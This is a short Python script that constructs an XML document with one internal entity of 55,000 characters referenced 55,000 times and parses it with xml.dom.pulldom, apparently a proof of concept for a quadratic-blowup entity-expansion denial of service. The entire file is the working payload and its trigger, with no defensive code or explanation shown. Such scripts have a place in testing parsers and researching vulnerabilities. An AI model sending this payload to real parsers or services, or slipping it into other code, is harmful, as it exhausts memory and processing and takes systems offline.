#!/usr/bin/env python3
# coding: UTF-8

import xml.dom.pulldom as pulldom

size = 55000
entity = 'A' * size
refs = '&x;' * size
data = '''\
<?xml version="1.0"?>
<!DOCTYPE DoS [
    <!ENTITY x "{entity}">
]>
<DoS>{entityReferences}</DoS>
'''.format(entity=entity, entityReferences=refs)

doc = pulldom.parseString(data)
for event, node in doc:
    pass
